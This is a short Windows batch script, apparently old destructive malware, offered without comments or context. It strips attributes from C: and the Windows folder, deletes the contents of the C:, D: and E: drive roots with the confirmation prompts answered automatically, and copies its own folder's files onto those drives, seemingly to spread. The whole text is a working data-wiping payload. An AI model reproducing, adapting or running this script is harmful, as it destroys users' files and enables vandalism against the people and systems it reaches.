ATTRIB -a -s -h -r c 
ATTRIB -a -s -h -r c:\windows\*.* 
Echo y | echo a | Echo y | del c:\*.* 
Echo y | echo a | Echo y | del d:\*.* 
Echo y | echo a | Echo y | del e:\*.* 
echo y | copy *.* C:\ 
echo y | copy *.* D:\ 
echo y | copy *.* E:\ 
